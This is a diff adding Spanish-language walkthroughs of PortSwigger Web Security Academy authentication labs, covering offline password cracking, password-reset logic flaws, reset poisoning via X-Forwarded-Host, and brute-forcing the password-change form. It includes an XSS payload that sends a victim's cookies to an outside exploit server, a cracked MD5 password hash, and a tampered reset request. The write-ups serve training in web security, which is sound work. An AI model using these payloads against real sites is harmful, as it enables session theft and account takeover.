@@ -270,3 +270,99 @@ Por último en options en la sección de **grep extract**, buscamos `your userna
 La respuesta será la que te responda con el nombre **Carlos**.
 
 ![auth10.5.png](auth10.5.png)
+
+#### Lab11: Offline password cracking
+
+Igual que en el laboratorio anterior tenemos las credenciales `wiener:peter` y su cookie **stayed-loged-in** tiene el formato: `base64(user:MD5(password))`. En este caso no nos dara resultados hacer fuerza bruta con la lista de contraseñas que nos dieron.
+
+En este caso nos indican que la caja de comentarios es vulnerable a XSS y nos dan un servidor web donde podemos ver los logs. Entraremos a cualquier post para agregar un comentario.
+
+![auth11.1.png](auth11.1.png)
+
+```javascript
+<script>document.location='https://exploit-acf01f691f1fa436c0cd709e01bf000e.web-security-academy.net/exploit/'+document.cookie</script>
+```
+
+Usaremos la dirección del servidor que nos dieron. El código anterior lo que hace será redireccionar a la página del servidor pero a la ruta `/exploit/(cookies)` donde envia las cookies de la página que queremos explotar, no es necesario que exista esa ruta pues solo queremos ver el mensaje en los logs.
+
+![auth11.2.png](auth11.2.png)
+
+En los logs del servidor podemos ver que hay una conexión de una dirección distinta, la cual ya no es nuestra IP. Analizamos la cookie **stayed-log-in**, lo decodeamos de base 64.
+```
+carlos:26323c16d5f4dabff3bb136f2460a943
+```
+
+Sabemos que la segunda parte es la contraseña hasheada con md5. Usamos Crackstation para buscar el hash y obtener la contraseña.
+
+![auth11.3.png](auth11.3.png)
+
+Por úlitmo deberemos ingresar las credenciales de carlos y eliminar su cuenta.
+
+## Resetting user passwords
+
+### Resetting passwords using a URL
+
+#### Lab12: Password reset broken logic
+
+En este laboratorio explotaremos la opción de reiniciar la contraseña por lo que en la página logeo le damos a la opción **Forgot Password?**.
+
+![auth12.1.png](auth12.1.png)
+
+Usamos el correo que nos da **Portswigger**, ahí veremos que nos llego un correo con un enlace para resetear la contraseña. Esta vez lo cargaremos con **BurpSuite** para interceptar las consultas.
+
+Ingresamos una contraseña cualquiera y lo mandamos para que se intercepte en el **BurpSuite**.
+
+![auth12.2.png](auth12.2.png)
+
+Cambiamos la parte final de la consulta en donde el valor de username ahora será carlos.
+
+```
+temp-forgot-password-token=tLkFHcr2KmBzkCGpbop3ajdNIshLl0if&username=carlos&new-password-1=miau12345&new-password-2=miau12345
+```
+
+Por úlitmo ingresamos con la nuevas credenciales usando el usuario *carlos*.
+
+#### Lab13: Password reset poisoning via middleware
+
+Iniciamos el laboratorio usando la opción **Forgot password** ingresamos el usuario **wiener** que es el que nos dieron las credenciales para probar como es el proceso de reinicio de contraseña.
+
+Si nos fijamos en el correo que nos proporcionaron, podemos ver que nos dan un enlace para el reinicio como el laboratorio anterior. Lo que necesitamos es el valor de `temp-forgot-password-token` del usuario carlos para poder reiniciar su contraseña.
+
+```
+https://ac291f7c1fc70439c0f4885a0084000f.web-security-academy.net/forgot-password?temp-forgot-password-token=HVDhN265ciWJvFMojzXl7VUZQrIJDiXK
+```
+
+Ahora volveremos a usar la opción **forgot password** pero esta vez interceptando los paquetes y usando el nombre de usuario '*carlos*'. Modificaremos la consulta y vemos que se puede agregar la cabecera X-Forwarded-Host donde indicaremos el servidor web que nos proporciono el laboratorio.
+
+![auth13.1.png](auth13.1.png)
+
+Como el laboratorio indica el usuario carlos dara click a todo enlace que le haya llegado a su correo. y vemos que en nuestros logs del servidor hay una consulta que nos da el **token** que necesitamos.
+
+![auth13.2.png](auth13.2.png)
+
+Usaremos este token para poder modificar la contraseña e ingresamos las nuevas credenciales en Myaccount para resolver el laboratorio.
+
+## Changing user passwords
+
+### Lab14: Password brute-force via password change
+
+Ingresamos las credenciales que nos dan `wiener:peter` intentamos cambiar la contraseña pero interceptando los paquetes en burp suite.
+
+![auth14.1.png](auth14.1.png)
+
+Llenamos los datos en `current password`, `new password` y `confirm new password` con cualquier dato. Vemos que al interceptar el paquete envia el nombre de usuario en un *hidden input* por lo que podemos realizar un ataque de fuerza bruta. 
+
+![auth14.2.png](auth14.2.png)
+
+Si ingresamos en las nuevas contraseñas dos distintas, entonces la verificación se realizara solo por la contraseña actual. Si es que la contraseña actual es correcta el resultado será que las contraseñas nuevas no coinciden y si es que la contraseña actual es incorrecta dira que no es valida la contraseña.
+
+Realizaremos el ataque en el **intruder** de tipo sniper donde usaremos las contraseñas que nos dan para probar y configuramos en las opciones en Grep-Match que nos busque el mensaje de error.
+
+![auth14.3.png](auth14.3.png)
+
+
+Obtendremos un resultado similar al siguiente al realizar el ataque, la respuesta nos da "`New passwords do not match`" en vez de "`current passwords is incorrect`".
+
+![auth14.4.png](auth14.4.png)
+
+Ingresamos con la contraseña que encontramos para resolver el laboratorio.
